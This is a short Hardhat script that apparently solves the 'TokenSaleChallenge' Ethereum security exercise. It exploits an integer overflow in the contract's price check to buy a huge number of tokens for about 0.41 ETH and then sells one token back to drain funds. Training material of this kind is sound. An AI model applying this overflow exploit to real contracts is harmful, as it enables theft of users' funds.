import { ethers } from "hardhat";

const contractAddress = "0x7B206a9F8A8E0587776980EAaD1A7DF97e7a3948";

async function main() {
  const challengeFactory = await ethers.getContractFactory("TokenSaleChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  // msg.value == numTokens * PRICE_PER_TOKEN
  // 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
  // (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH
  const buyTx = await challengeContract.buy("115792089237316195423570985008687907853269984665640564039458", {
    value: "415992086870360064",
  });
  await buyTx.wait();

  const sellTx = await challengeContract.sell(1);
  await sellTx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
